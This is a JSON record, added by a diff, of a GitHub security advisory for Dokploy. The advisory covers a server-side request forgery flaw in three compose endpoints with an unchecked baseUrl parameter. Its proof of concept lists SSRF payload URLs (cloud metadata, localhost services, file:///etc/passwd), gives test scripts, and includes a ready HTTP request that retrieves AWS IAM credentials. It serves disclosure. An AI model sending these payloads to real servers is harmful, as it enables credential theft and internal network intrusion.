@@ -1,0 +1,46 @@
+{
+  "global": null,
+  "id": "GHSA-gxcw-hpm8-vq4m",
+  "repo": {
+    "cve_id": null,
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 7.7,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-918"
+    ],
+    "description": "### Summary\r\n\r\nThree tRPC endpoints in Dokploy's compose router (`compose.templates`, `compose.getTags`, `compose.deployTemplate`) accept a user-controlled `baseUrl` parameter that gets passed directly to server-side `fetch()` calls with no URL validation, no protocol restriction, and no private IP blocking. Any authenticated user can make the Dokploy server send HTTP requests to arbitrary internal or external URLs, allowing access to cloud metadata services (AWS/GCP/Azure), internal network services, and other resources that should not be reachable from the application.\r\n\r\n### Details\r\n\r\nThe three vulnerable endpoints all accept `baseUrl` as `z.string().optional()` with no further validation:\r\n\r\n`apps/dokploy/server/api/routers/compose.ts`:\r\n\r\n```typescript\r\n// line 687\r\ntemplates: protectedProcedure\r\n    .input(z.object({ baseUrl: z.string().optional() }))   // no URL validation\r\n    .query(async ({ input }) => {\r\n        const githubTemplates = await fetchTemplatesList(input.baseUrl);\r\n        // ...\r\n    }),\r\n\r\n// line 705\r\ngetTags: protectedProcedure\r\n    .input(z.object({ baseUrl: z.string().optional() }))   // no URL validation\r\n    .query(async ({ input }) => {\r\n        const githubTemplates = await fetchTemplatesList(input.baseUrl);\r\n        // ...\r\n    }),\r\n\r\n// line 574\r\ndeployTemplate: protectedProcedure\r\n    .input(z.object({\r\n        environmentId: z.string(),\r\n        serverId: z.string().optional(),\r\n        id: z.string(),\r\n        baseUrl: z.string().optional(),   // no URL validation\r\n    }))\r\n    .mutation(async ({ ctx, input }) => {\r\n        const [template, templateLogo] = await Promise.all([\r\n            fetchTemplateFiles(input.id, input.baseUrl),\r\n            fetchTemplateLogo(input.id, input.baseUrl),\r\n        ]);\r\n        // ...\r\n    }),\r\n```\r\n\r\nThe user-supplied `baseUrl` goes directly into `fetch()` in `packages/server/src/templates/github.ts`:\r\n\r\n```typescript\r\n// line 57\r\nexport async function fetchTemplatesList(\r\n    baseUrl = \"https://templates.dokploy.com\"\r\n) {\r\n    const response = await fetch(`${baseUrl}/meta.json`, {   // user-controlled URL\r\n        signal: AbortSignal.timeout(10000),\r\n    });\r\n    const templates = await response.json();\r\n    return templates;   // response data returned to caller\r\n}\r\n\r\n// line 125\r\nexport async function fetchTemplateFiles(templateId, baseUrl = \"https://templates.dokploy.com\") {\r\n    const [r1, r2] = await Promise.all([\r\n        fetch(`${baseUrl}/blueprints/${templateId}/template.toml`, { ... }),   // user-controlled\r\n        fetch(`${baseUrl}/blueprints/${templateId}/docker-compose.yml`, { ... }),  // user-controlled\r\n    ]);\r\n    // ...\r\n}\r\n\r\n// line 88\r\nexport async function fetchTemplateLogo(templateId, baseUrl = \"https://templates.dokploy.com\") {\r\n    const response = await fetch(\r\n        `${baseUrl}/blueprints/${templateId}/${template.logo}`, { ... }   // user-controlled\r\n    );\r\n    // ...\r\n}\r\n```\r\n\r\nThe fetch URL appends a fixed path like `/meta.json`, but the attacker can neutralize this using a query string. For example, setting `baseUrl` to `http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name?x=` makes the full URL `http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name?x=/meta.json`. The appended part becomes a harmless query parameter, giving the attacker full control over the effective request path.\r\n\r\nThere is no URL parsing, no protocol enforcement, no private IP blocklist, no domain allowlist, and no DNS rebinding protection on any of the three endpoints.\r\n\r\n### PoC\r\n\r\n**Step 1: Verify all dangerous URLs pass the schema**\r\n\r\nUsing the exact Zod schema from Dokploy:\r\n\r\n```javascript\r\nconst { z } = require(\"zod\");\r\n\r\nconst templatesInput = z.object({ baseUrl: z.string().optional() });\r\n\r\nconst targets = [\r\n    \"http://169.254.169.254/latest\",\r\n    \"http://metadata.google.internal\",\r\n    \"http://localhost:5432\",\r\n    \"http://localhost:2375\",\r\n    \"http://10.0.0.1:8080\",\r\n    \"file:///etc/passwd\",\r\n];\r\n\r\nfor (const url of targets) {\r\n    const result = templatesInput.safeParse({ baseUrl: url });\r\n    console.log(`${result.success ? \"ACCEPTED\" : \"REJECTED\"}  ${url}`);\r\n}\r\n```\r\n\r\nOutput:\r\n\r\n```\r\nACCEPTED  http://169.254.169.254/latest\r\nACCEPTED  http://metadata.google.internal\r\nACCEPTED  http://localhost:5432\r\nACCEPTED  http://localhost:2375\r\nACCEPTED  http://10.0.0.1:8080\r\nACCEPTED  file:///etc/passwd\r\n```\r\n\r\nAll 6 SSRF payloads are accepted. The schema is `z.string().optional()` which accepts any string.\r\n\r\n**Step 2: Verify the server actually makes the request**\r\n\r\nThis test starts a local HTTP server to simulate an internal service, then calls the exact `fetchTemplatesList()` function from Dokploy's source code:\r\n\r\n```javascript\r\nconst http = require(\"http\");\r\n\r\nasync function fetchTemplatesList(baseUrl = \"https://templates.dokploy.com\") {\r\n    const response = await fetch(`${baseUrl}/meta.json`, {\r\n        signal: AbortSignal.timeout(10000),\r\n    });\r\n    if (!response.ok) throw new Error(`Failed: ${response.statusText}`);\r\n    return await response.json();\r\n}\r\n\r\nconst server = http.createServer((req, res) => {\r\n    console.log(`[INTERNAL SERVICE] Received: ${req.method} ${req.url}`);\r\n    res.writeHead(200, { \"Content-Type\": \"application/json\" });\r\n    res.end(JSON.stringify({ proof: \"SSRF reached internal service\", secret: \"example-key\" }));\r\n});\r\n\r\nserver.listen(0, \"127.0.0.1\", async () => {\r\n    const port = server.address().port;\r\n    console.log(`Mock service on 127.0.0.1:${port}`);\r\n    try {\r\n        const data = await fetchTemplatesList(`http://127.0.0.1:${port}`);\r\n        console.log(\"Data exfiltrated:\", JSON.stringify(data));\r\n    } catch (e) { console.log(\"Error:\", e.message); }\r\n    server.close();\r\n});\r\n```\r\n\r\nOutput:\r\n\r\n```\r\nMock service on 127.0.0.1:36837\r\n[INTERNAL SERVICE] Received: GET /meta.json\r\nData exfiltrated: {\"proof\":\"SSRF reached internal service\",\"secret\":\"example-key\"}\r\n```\r\n\r\nThe Dokploy server made a GET request to the mock internal service, and the response data was returned through the function.\r\n\r\n**Step 3: Exploit against a live Dokploy instance**\r\n\r\nAny authenticated user sends:\r\n\r\n```http\r\nPOST /api/trpc/compose.templates?batch=1 HTTP/1.1\r\nContent-Type: application/json\r\nCookie: better-auth.session_token=<any-valid-session>\r\n\r\n{\r\n  \"0\": {\r\n    \"json\": {\r\n      \"baseUrl\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name?x=\"\r\n    }\r\n  }\r\n}\r\n```\r\n\r\nThe server fetches `http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name?x=/meta.json`. The AWS metadata endpoint returns JSON containing temporary IAM credentials (AccessKeyId, SecretAccessKey, Token), which come back in the API response.\r\n\r\n### Impact\r\n\r\nThis is a Server-Side Request Forgery vulnerability. Any authenticated user (no admin role needed, just basic login) can force the Dokploy server to make HTTP GET requests to arbitrary URLs. If the target responds with JSON, the data is returned in the API response.\r\n\r\nIn cloud environments, the attacker can steal IAM credentials from AWS metadata (`169.254.169.254`), OAuth tokens from GCP metadata, or managed identity tokens from Azure. They can also probe internal network services, scan ports, access the Docker daemon API at `localhost:2375`, and map internal network topology through timing and error differences.\r\n\r\nThe three affected endpoints are `compose.templates`, `compose.getTags`, and `compose.deployTemplate`. All use `protectedProcedure` which only requires a valid login session with no special permissions.",
+    "ghsa_id": "GHSA-gxcw-hpm8-vq4m",
+    "html_url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-gxcw-hpm8-vq4m",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-gxcw-hpm8-vq4m"
+      }
+    ],
+    "published_at": "2026-11-12T08:16:18Z",
+    "references": [],
+    "severity": "high",
+    "summary": "Server-Side Request Forgery (SSRF) via Template baseUrl Parameter",
+    "updated_at": "2026-11-12T08:16:18Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "other",
+          "name": "dokploy"
+        },
+        "patched_versions": "0.31.1",
+        "vulnerable_version_range": "< 0.31.1"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "Dokploy/dokploy"
+}
